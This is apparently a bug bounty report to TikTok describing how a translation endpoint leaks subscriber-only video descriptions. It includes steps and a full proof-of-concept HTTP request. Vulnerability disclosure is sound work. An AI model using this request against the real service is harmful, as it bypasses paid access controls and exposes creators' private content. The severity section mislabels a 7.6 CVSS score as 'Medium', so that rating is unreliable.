**Program:** Tiktok  **Asset:** tiktok.com  **Weakness:** Information disclosure

**Title: Unauthorized Access to Subscriber-Only Video Descriptions via Translation Endpoint
## Description:

TikTok provides an endpoint intended to translate video descriptions into different languages:

`/aweme/v1/translation/description/`

This endpoint accepts parameters such as `item_id` and `target_lang`.

However, the endpoint does not validate whether the requester has permission to access the underlying video content before performing the translation.

An attacker can supply the `item_id` of a subscriber-only video and request translation into another language (e.g., French). Even when the original description is already in English, the backend processes the request and returns the translated version, thereby exposing the original description.

This results in a bypass of access control protections for subscriber-only content.




---

## Steps to Reproduce
1. Identify a subscriber-only TikTok video.

2. Obtain the public `item_id` of the video.

3. Send the following request (as shown in the image below, if the video description is already english change `target_lang` to any other language like `fr` which is france):
```
GET /aweme/v1/translation/description/?WebIdLastTime=1772402811&aid=1988&app_language=en-GB&app_name=tiktok_web&browser_language=en-GB&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F145.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&data_collection_enabled=true&device_id=7612412068823090689&device_platform=web_pc&focus_state=true&from_page=user&history_len=6&is_fullscreen=false&is_page_visible=true&item_id=ITEM_ID&odinId=7407740357695439878&os=windows&priority_region=NG&referer=https%3A%2F%2Fwww.tiktok.com%2F&region=NG&root_referer=https%3A%2F%2Fwww.tiktok.com%2F&screen_height=720&screen_width=1280&target_lang=fr&tz_name=Africa%2FLagos&user_is_login=true&verifyFp=verify_mmo21qu3_TcQTwa31_2vrd_4ux7_99Us_cl2gz1Yfe2TI&webcast_language=en-GB HTTP/2
Host: www.tiktok.com
Cookie: [redacted]
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.tiktok.com/@boymayola/photo/7616504487141739784?lang=en-GB
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Priority: u=1, i
```
<img width="326" height="275" alt="Screenshot 2026-03-22 194753" src="https://github.com/user-attachments/assets/1bf40518-74b4-4baf-97a2-6194d28f75be" />
4.  Observe that the response returns the translated description of the subscriber-only video.

5. (Optional) Translate the response back to English using any translator to fully understand the content.


---

## Impact
- Unauthorized users can access subscriber-only video descriptions without subscribing.
- This may expose:
  - Exclusive content intended only for subscribers
  - Promotional or discount codes
  - Sensitive or private creator information

- Additionally:
  - If a creator edits the description after a user unsubscribes, the attacker can still retrieve the latest version of the description, resulting in continued information disclosure.

This vulnerability breaks the confidentiality of TikTok’s subscription-based content model and may lead to financial and privacy impacts for content creators.


---

## Severity
**CVSS v3.0 Base Score:** 7.6 → Medium  

| Metric | Value |
|--------|-------|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | None |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | None |
| Availability (A) | None |

---
